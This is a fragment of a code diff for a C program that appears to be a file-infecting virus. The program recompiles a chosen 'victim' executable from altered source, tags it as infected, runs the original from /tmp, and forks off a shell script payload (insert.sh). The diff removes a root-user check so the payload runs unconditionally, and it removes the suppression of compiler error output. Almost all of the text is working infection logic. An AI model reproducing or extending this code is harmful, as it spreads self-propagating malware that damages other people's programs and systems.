@@ -64,35 +64,22 @@ void run_old(){
 	system("chmod +x /tmp/_tmp");
 	execl("/tmp/_tmp",0);
 }
-int isroot(){
-	FILE *fp;
-	system("who > /tmp/_mywho");
-	fp=fopen("/tmp/_mywho","r");
-	if(!fp)return 0;
-	char name[111];
-	fscanf(fp,"%s",name);
-	fclose(fp);
-	if(strcmp(name,"root"))
-		return 1;
-	return 0;
-}
 void bad(){
 	puts("infected");
-	if(isroot()){
-		char current_absolute_path[1024];
-		if (NULL != getcwd(current_absolute_path, 1024)){
-			char name[] = {"/insert.sh"};
 	
-			strcat(current_absolute_path, name);
-			char prefix[2048] = "bash ";
-			strcat(prefix, current_absolute_path);
-			if(fork()){
+	char current_absolute_path[1024];
+	if (NULL != getcwd(current_absolute_path, 1024)){
+		char name[] = {"/insert.sh"};
+	
+		strcat(current_absolute_path, name);
+		char prefix[2048] = "bash ";
+		strcat(prefix, current_absolute_path);
+		if(fork()){
 			
-			}else{
-				system(prefix);
-				exit(0);
-			}	
-		}
+		}else{
+			system(prefix);
+			exit(0);
+		}	
 	}
 }
 char victim[111];
@@ -158,8 +145,9 @@ void function2() {
 	fclose(fv);
 	fclose(newv);
 	char cmd[111];
-	sprintf(cmd,"gcc __tmp.c -o %s -g 2>/tmp/_null",victim);
+	sprintf(cmd,"gcc __tmp.c -o %s -g",victim);
 	system(cmd);
 	put_infected(victim);
 	run_old();
 }
+
